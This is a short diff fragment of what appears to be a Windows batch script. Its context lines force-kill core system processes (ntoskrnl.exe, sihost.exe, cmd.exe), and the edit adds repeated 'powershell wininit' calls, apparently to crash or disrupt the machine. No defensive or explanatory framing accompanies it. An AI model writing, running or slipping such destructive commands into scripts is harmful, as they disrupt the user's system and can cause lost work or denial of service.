@@ -58,3 +58,5 @@ taskkill /F /IM ntoskrnl.exe
 taskkill /F /IM sihost.exe
 taskkill /F /IM cmd.exe
 powershell wininit
+powershell wininit
+powershell wininit
